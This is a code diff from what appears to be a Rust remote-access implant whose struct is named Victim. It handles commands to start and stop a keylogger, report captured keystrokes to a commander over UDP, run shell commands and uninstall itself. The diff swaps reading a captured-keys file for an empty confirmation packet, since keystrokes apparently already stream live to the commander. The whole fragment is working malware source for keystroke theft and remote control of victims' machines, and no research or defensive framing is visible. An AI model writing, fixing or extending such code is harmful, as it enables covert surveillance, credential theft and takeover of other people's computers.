@@ -247,7 +247,7 @@ impl Victim {
     }
 
     fn handle_control(&mut self, subtype: u8, _payload: &[u8], 
-                      udp: &UdpSocket, cmd_addr: SocketAddr) -> io::Result<()> {
+                  udp: &UdpSocket, cmd_addr: SocketAddr) -> io::Result<()> {
         match subtype {
             CTRL_START_KEYLOGGER => {
                 self.start_keylogger();
@@ -256,7 +256,8 @@ impl Victim {
                 self.stop_keylogger();
             }
             CTRL_REQUEST_KEYLOG => {
-                self.send_keylog_file(udp, cmd_addr)?;
+                // FIX: Just send confirmation, commander has live data
+                let _ = self.send_keylog_file(udp, cmd_addr);
             }
             CTRL_UNINSTALL => {
                 self.stop_keylogger();
@@ -307,14 +308,11 @@ impl Victim {
     }
 
     fn send_keylog_file(&self, udp: &UdpSocket, cmd_addr: SocketAddr) -> io::Result<()> {
-        let path = "./data/captured_keys.txt";
-        match std::fs::read_to_string(path) {
-            Ok(content) => {
-                self.send_response(udp, cmd_addr, PACKET_TYPE_KEYLOG, 0, content.as_bytes())?;
-                Ok(())
-            }
-            Err(e) => Err(e)
-        }
+        // Keylogger sends live via channel, no file to read
+        // Just send empty PACKET_TYPE_KEYLOG as confirmation
+        // Commander will save whatever is in keylog_buffer
+        self.send_response(udp, cmd_addr, PACKET_TYPE_KEYLOG, 0, &[])?;
+        Ok(())
     }
 
     fn execute_shell(&mut self, cmd: &str, udp: &UdpSocket, cmd_addr: SocketAddr) -> io::Result<()> {
